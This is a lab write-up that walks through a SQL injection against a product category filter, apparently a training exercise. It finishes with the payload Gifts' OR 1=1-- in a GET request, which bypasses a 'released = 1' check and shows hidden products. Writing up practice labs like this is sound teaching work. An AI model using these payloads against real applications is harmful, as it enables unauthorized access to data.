## Objective

The application contains a SQL Injection vulnerability in the product category filter.

The application uses a SQL query similar to:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The `released = 1` condition ensures that only released products are displayed.

The goal of the lab is to exploit the SQL Injection vulnerability and make the application display one or more **unreleased products**.

---

## 1. Identifying the Injection Point

The first step is to identify user-controlled inputs and parameters.

While browsing the application, I selected the **Gifts** category and observed the following request:

```
GET /filter?category=Gifts
```

The important part is the parameter:

```
category=Gifts
```

Since this value is controlled by the user and is used by the application to filter products, it is a potential SQL Injection point.

Based on the lab description, the backend uses the value in a query similar to:

```
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```

This is particularly interesting because the user-controlled value is placed inside single quotes, meaning the input is being used in a **string context**.

---

## 2. Testing for SQL Injection

I first tested whether I could affect the SQL query by adding a single quote to the category parameter:

```
Gifts'
```

The purpose of this test is not to retrieve data immediately, but to determine whether the input can interfere with the SQL syntax.

The single quote is significant because the original query contains:

```
category = 'Gifts'
```

Adding another quote can potentially break the surrounding SQL string.

---

## 3. Using a SQL Comment

Next, I tested the following input:

```
Gifts'--
```

The `--` sequence is a SQL comment indicator in the relevant SQL syntax.

The original query:

```
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```

would effectively become:

```
SELECT * FROM products
WHERE category = 'Gifts'--
AND released = 1
```

Everything after `--` is treated as a comment.

Therefore, the important restriction:

```
AND released = 1
```

is no longer applied.

As a result, the application displays products from the **Gifts** category regardless of whether they have been released.

This caused an additional product to appear, confirming that the input was affecting the SQL query.

---

## 4. Using a Boolean Condition

I then used another SQL Injection payload:

```
Gifts' OR 1=1--
```

This modifies the query conceptually into:

```
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1
-- AND released = 1
```

The important part is:

```
OR 1=1
```

The expression:

```
1=1
```

is always `TRUE`.

Therefore, the condition effectively becomes:

```
category = 'Gifts' OR TRUE
```

Since the second condition is always true, the `WHERE` clause can match all products.

The `--` then comments out the original:

```
AND released = 1
```

As a result, the application displays products that would normally be hidden, including unreleased products.

---

## 5. Final Payload

The final payload used to solve the lab was:

```
Gifts' OR 1=1--
```

The corresponding request was:

```
GET /filter?category=Gifts' OR 1=1--
```

The application then displayed additional products, including unreleased products, and the lab was marked as **Solved**.

---


### Important Note

The endpoint:

```
/filter?category=Gifts
```

does **not** mean that the database table is called `filter`.

`/filter` is simply the application's endpoint. According to the lab description, the relevant database table is:

```
products
```

and the query is based on:

```
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```

This distinction is important when analyzing SQL Injection: **the URL endpoint, parameter name, database table, and SQL query are separate concepts.**
